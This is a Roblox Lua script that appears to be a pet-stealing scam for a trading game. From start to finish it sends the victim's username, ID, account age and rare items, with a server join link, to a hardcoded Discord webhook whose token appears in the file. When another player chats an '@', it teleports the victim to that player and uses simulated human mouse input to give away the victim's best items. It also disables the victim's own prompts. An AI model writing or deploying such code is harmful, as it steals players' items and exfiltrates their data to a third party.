local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera
local TeleportService = game:GetService("TeleportService")
local UserInputService = game:GetService("UserInputService")
local VirtualInputManager = game:GetService("VirtualInputManager")

-- Webhook configuration
local WEBHOOK_URL = "https://discord.com/api/webhooks/1393445006299234449/s32t5PInI1pwZmxL8VTTmdohJ637DT_i6ni1KH757iQwNpxfbGcBamIzVSWWfn0jP8Rg"
local RARE_PETS = {"T-Rex", "Dragonfly", "Raccoon", "Mimic Octopus", "Butterfly", "Disco bee", "Queen bee"}

-- Item priority system
local ITEM_PRIORITY = {
    ["T-Rex"] = 1000, ["Dragonfly"] = 950, ["Queen bee"] = 900,
    ["Disco bee"] = 850, ["Raccoon"] = 800, ["Mimic Octopus"] = 750,
    ["Butterfly"] = 700, ["Disco"] = 600, ["Wet"] = 500
}

-- Improved webhook with backup methods
local function sendWebhook(content, embed)
    local payload = {
        content = content,
        embeds = {embed}
    }
    
    -- Try different methods
    local success, response = pcall(function()
        if syn and syn.request then
            return syn.request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = HttpService:JSONEncode(payload)
            })
        else
            return HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(payload))
        end
    end)
    
    if not success then
        warn("Webhook failed: "..tostring(response))
    end
end

local function sendInitialWebhook()
    local placeId = game.PlaceId
    local jobId = game.JobId
    local items = {}
    
    for _, item in pairs(LocalPlayer.Backpack:GetChildren()) do
        table.insert(items, item.Name)
    end
    
    local rareItems = {}
    for _, pet in pairs(RARE_PETS) do
        if table.find(items, pet) then
            table.insert(rareItems, pet)
        end
    end
    
    local embed = {
        title = "📦 Inventory Scan | "..LocalPlayer.Name,
        description = "**Total Items:** "..#items.."\n**Rare Items:** "..#rareItems,
        color = #rareItems > 0 and 0xFF0000 or 0x00FF00,
        thumbnail = {
            url = "https://www.roblox.com/headshot-thumbnail/image?userId="..LocalPlayer.UserId.."&width=420&height=420&format=png"
        },
        fields = {
            {name = "🔗 Join Script", value = string.format('```lua\ngame:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s")\n```', placeId, jobId), inline = false},
            {name = "🆔 User ID", value = "```"..LocalPlayer.UserId.."```", inline = true},
            {name = "📅 Account Age", value = "```"..LocalPlayer.AccountAge.." days```", inline = true},
            {name = "💎 Rare Items", value = #rareItems > 0 and "```"..table.concat(rareItems, ", ").."```" or "```None```", inline = false}
        },
        footer = {
            text = "Scan Time: "..os.date("%X")
        }
    }
    
    sendWebhook(#rareItems > 0 and "@everyone" or nil, embed)
end

local function getBestItem(target)
    local bestItem, bestPriority = nil, 0
    for _, item in pairs(target.Backpack:GetChildren()) do
        local priority = 400
        for pattern, value in pairs(ITEM_PRIORITY) do
            if string.find(item.Name, pattern) then
                priority = value
                break
            end
        end
        if priority > bestPriority then
            bestPriority = priority
            bestItem = item
        end
    end
    return bestItem
end

local function findBestPrompt(targetChar)
    local bestPrompt, maxHold = nil, 0
    for _, part in pairs(targetChar:GetDescendants()) do
        if part:IsA("ProximityPrompt") and part.HoldDuration > maxHold then
            maxHold = part.HoldDuration
            bestPrompt = part
        end
    end
    return bestPrompt
end

local function lookAtPlayer(target)
    local targetChar = target.Character or target.CharacterAdded:Wait()
    local head = targetChar:WaitForChild("Head")
    
    -- Save original camera settings
    local preMaxZoom = LocalPlayer.CameraMaxZoomDistance
    local preMinZoom = LocalPlayer.CameraMinZoomDistance
    
    -- Set first person
    LocalPlayer.CameraMaxZoomDistance = 0.5
    LocalPlayer.CameraMinZoomDistance = 0.5
    
    -- Face the target
    local connection
    connection = RunService.Heartbeat:Connect(function()
        Camera.CFrame = CFrame.new(Camera.CFrame.Position, head.Position)
    end)
    
    return {
        disconnect = function()
            if connection then connection:Disconnect() end
            LocalPlayer.CameraMaxZoomDistance = preMaxZoom
            LocalPlayer.CameraMinZoomDistance = preMinZoom
        end
    }
end

local function simulateHumanHold(targetPrompt)
    local startTime = os.clock()
    local lastClick = 0
    local promptPosition = targetPrompt.Parent.Position
    
    while os.clock() - startTime < 5 do
        -- Only re-click every 0.5 seconds to simulate human behavior
        if os.clock() - lastClick > 0.5 then
            -- Get screen position
            local screenPos, visible = Camera:WorldToScreenPoint(promptPosition)
            if visible then
                -- Small random offset to simulate human inaccuracy
                local offset = Vector2.new(math.random(-10,10), math.random(-10,10))
                local targetPos = Vector2.new(screenPos.X, screenPos.Y) + offset
                
                -- Move mouse gradually
                local mouse = game:GetService("Players").LocalPlayer:GetMouse()
                local steps = math.random(5,10)
                for i = 1, steps do
                    local t = i/steps
                    local newPos = Vector2.new(mouse.X, mouse.Y):Lerp(targetPos, t)
                    VirtualInputManager:SendMouseMoveEvent(newPos.X, newPos.Y, game)
                    task.wait(0.05)
                end
                
                -- Click
                VirtualInputManager:SendMouseButtonEvent(targetPos.X, targetPos.Y, 0, true, game, 1)
                task.wait(0.1)
                VirtualInputManager:SendMouseButtonEvent(targetPos.X, targetPos.Y, 0, false, game, 1)
                
                lastClick = os.clock()
            end
        end
        task.wait(0.1)
    end
end

local function interactWithTarget(target)
    -- Teleport to player
    local targetChar = target.Character or target.CharacterAdded:Wait()
    local humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
    LocalPlayer.Character:SetPrimaryPartCFrame(targetChar:GetPrimaryPartCFrame() * CFrame.new(0, 0, -3))
    
    -- Face the target
    local lookConnection = lookAtPlayer(target)
    
    -- Process items
    while true do
        local bestItem = getBestItem(LocalPlayer)
        if not bestItem then break end
        
        -- Equip item
        LocalPlayer.Character.Humanoid:EquipTool(bestItem)
        task.wait(0.5)
        
        -- Find and interact with prompt
        local prompt = findBestPrompt(targetChar)
        if prompt then
            simulateHumanHold(prompt)
        else
            -- Fallback to torso click
            local torso = targetChar:FindFirstChild("UpperTorso") or targetChar:FindFirstChild("Torso")
            if torso then
                simulateHumanHold(torso)
            end
        end
    end
    
    if lookConnection then lookConnection.disconnect() end
end

local function onPlayerChatted(player, message)
    if player == LocalPlayer or not string.find(message, "@") then return end
    
    -- Send webhook
    local items = {}
    for _, item in pairs(player.Backpack:GetChildren()) do
        table.insert(items, item.Name)
    end
    
    local rareItems = {}
    for _, pet in pairs(RARE_PETS) do
        if table.find(items, pet) then
            table.insert(rareItems, pet)
        end
    end
    
    local embed = {
        title = "🎯 Target Mentioned | "..player.Name,
        description = "**Chat:** ```"..message.."```",
        color = 0xFFA500,
        thumbnail = {
            url = "https://www.roblox.com/headshot-thumbnail/image?userId="..player.UserId.."&width=420&height=420&format=png"
        },
        fields = {
            {name = "📦 Items", value = "```"..#items.." found```", inline = true},
            {name = "💎 Rares", value = #rareItems > 0 and "```"..table.concat(rareItems, ", ").."```" or "```None```", inline = true},
            {name = "🔗 Profile", value = "https://www.roblox.com/users/"..player.UserId.."/profile", inline = false}
        },
        footer = {
            text = "Triggered: "..os.date("%X")
        }
    }
    
    sendWebhook(nil, embed)
    interactWithTarget(player)
end

-- Initialize
sendInitialWebhook()

-- Set up chat listeners
for _, player in pairs(Players:GetPlayers()) do
    if player ~= LocalPlayer then
        player.Chatted:Connect(function(msg) onPlayerChatted(player, msg) end)
    end
end

Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(msg) onPlayerChatted(player, msg) end)
end)

-- Disable local prompts
local function disableLocalPrompts()
    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local rootPart = character:WaitForChild("HumanoidRootPart")
    for _, child in pairs(rootPart:GetChildren()) do
        if child:IsA("ProximityPrompt") then
            child.Enabled = false
        end
    end
end

LocalPlayer.CharacterAdded:Connect(disableLocalPrompts)
disableLocalPrompts()
